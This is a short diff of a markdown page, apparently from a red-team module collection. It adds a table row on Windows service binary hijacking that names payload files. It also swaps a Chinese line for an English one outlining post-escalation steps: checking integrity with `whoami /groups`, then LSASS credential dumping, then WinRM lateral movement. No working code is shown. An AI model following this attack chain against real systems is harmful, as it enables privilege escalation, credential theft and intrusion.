+| Writable service binary/ImagePath | Service binary hijack + registry backup rollback | `m06-service-binary-payload.c` + `m06-service-hijack.ps1` |
 
-提权后固定动作：`whoami /groups` 记录新完整性 → 如需凭据抓取见 [07-credentials-lsass](/modules/07-credentials-lsass) → 横向见 [15-winrm-lateral](/modules/15-winrm-lateral)。
+Fixed actions after elevate: record new integrity with `whoami /groups` → credentials if needed: [07-credentials-lsass](/modules/07-credentials-lsass) → lateral: [15-winrm-lateral](/modules/15-winrm-lateral).
